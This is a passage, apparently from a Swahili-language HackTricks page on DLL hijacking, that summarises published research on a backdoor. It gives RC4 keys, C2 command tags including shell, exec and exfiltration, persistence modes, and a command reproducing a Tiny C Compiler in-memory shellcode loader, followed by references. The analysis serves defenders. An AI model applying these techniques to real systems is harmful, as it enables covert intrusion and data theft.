- Config iko ndani ya faili iliyowekwa `BluetoothService` kwa **offset 0x30808** (ukubwa **0x980**) na imetatuliwa kwa RC4 kwa ufunguo `qwhvb^435h&*7`, ikifunua URL ya C2 na User-Agent.
- Beacons hujenga profile ya host inayotenganishwa kwa pointi, huweka tag `4Q` mwanzo, kisha huificha kwa RC4 kwa ufunguo `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Majibu yanatatuliwa kwa RC4 na kupelekwa kupitia switch ya tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Mode ya utekelezaji inadhibitiwa na CLI args: hakuna args = install persistence (service/Run key) inayorejeleza kwa `-i`; `-i` inajirusha tena yenyewe na `-k`; `-k` inaruka install na inafanya payload.

Loader mbadala uliotambuliwa
- Ushambulizi uleule uliweka Tiny C Compiler na ukatekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, na `libtcc.dll` kando yake. Chanzo cha C kilichotolewa na mshambuliaji kilijumuisha shellcode, kilikokomeshwa, na kukimbia ndani ya kumbukumbu bila kugusa diski kwa PE. Rudia kwa:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hatua hii ya compile-and-run iliyotegemea TCC iliingiza `Wininet.dll` wakati wa runtime na kuvuta shellcode ya awamu ya pili kutoka kwa URL iliyowekwa, ikitoa loader inayobadilika inayojifanya kuwa ni utekelezaji wa compiler run.

## Marejeo

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
